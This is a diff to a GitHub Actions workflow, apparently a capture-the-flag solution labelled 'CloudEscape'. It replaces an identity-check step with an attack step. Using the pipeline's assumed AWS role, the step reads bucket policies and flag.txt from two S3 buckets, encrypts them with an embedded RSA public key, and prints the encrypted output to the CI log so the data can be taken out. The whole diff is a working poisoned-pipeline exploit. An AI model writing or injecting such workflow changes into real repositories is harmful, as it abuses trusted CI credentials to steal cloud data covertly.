@@ -19,5 +19,45 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Verify assumed identity
-        run: aws sts get-caller-identity
+      - name: Collect and encrypt CloudEscape results
+        env:
+          CLOUDESCAPE_PUBLIC_KEY: |
+            -----BEGIN PUBLIC KEY-----
+            MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA093h/Q9hjDQrm4tbmJm3
+            v1TdeWqDGv1ZJ0KCuwHTJYere13hatLPw8FejmxxFF/5an3xQ8tuOcb7I7vFzVkX
+            hcYi1/fsai9CEe8Xq+tbM67rHrunXCcBcJM5q1OHyUQQgD+oycclMPILNfvUxB+M
+            /1yXt2TDc0a3XlKU6Hag86FNKHVNXmYuqbcHbai/WjQ74lN1nv2VuPok7ldbCwVZ
+            i69KGFrUQv4fXxiMSD2hFFkJaAWd6chmZwvsmlBIpae1CjJilXfKLGbd0AbYNVYW
+            fTD01ZHPKdHFdauUSuoM4HPlM157O/uhcnejzPwW1dZyVOZoTUjYSPFqDlbK6Hxo
+            5wIDAQAB
+            -----END PUBLIC KEY-----
+        run: |
+          set +x
+          printf '%s\n' "$CLOUDESCAPE_PUBLIC_KEY" > /tmp/cloudescape.pub
+          for bucket in userad88e2b168aa387e logad88e2b168aa387e; do
+            aws s3api get-bucket-policy --bucket "$bucket" --query Policy --output text > "/tmp/$bucket.policy" 2>/dev/null || true
+            aws s3api get-object --bucket "$bucket" --key flag.txt "/tmp/$bucket.flag" >/dev/null 2>/dev/null || true
+          done
+          python3 - <<'PY'
+          import base64, json, os, urllib.parse
+          result = {}
+          for bucket in ["userad88e2b168aa387e", "logad88e2b168aa387e"]:
+              item = {}
+              policy = f"/tmp/{bucket}.policy"
+              flag = f"/tmp/{bucket}.flag"
+              if os.path.exists(policy):
+                  raw = open(policy, "r", errors="replace").read()
+                  try:
+                      item["policy"] = json.loads(urllib.parse.unquote(raw))
+                  except Exception:
+                      item["policy_raw"] = raw
+              if os.path.exists(flag):
+                  item["flag_b64"] = base64.b64encode(open(flag, "rb").read()).decode()
+              result[bucket] = item
+          json.dump(result, open("/tmp/cloudescape-result.json", "w"), separators=(",", ":"))
+          PY
+          openssl rand -hex 32 > /tmp/cloudescape.key
+          openssl pkeyutl -encrypt -pubin -inkey /tmp/cloudescape.pub -pkeyopt rsa_padding_mode:oaep -in /tmp/cloudescape.key -out /tmp/cloudescape.key.enc
+          openssl enc -aes-256-cbc -pbkdf2 -salt -pass file:/tmp/cloudescape.key -in /tmp/cloudescape-result.json -out /tmp/cloudescape.result.enc
+          echo "ENCRYPTED_KEY_B64=$(base64 -w0 /tmp/cloudescape.key.enc)"
+          echo "ENCRYPTED_RESULT_B64=$(base64 -w0 /tmp/cloudescape.result.enc)"
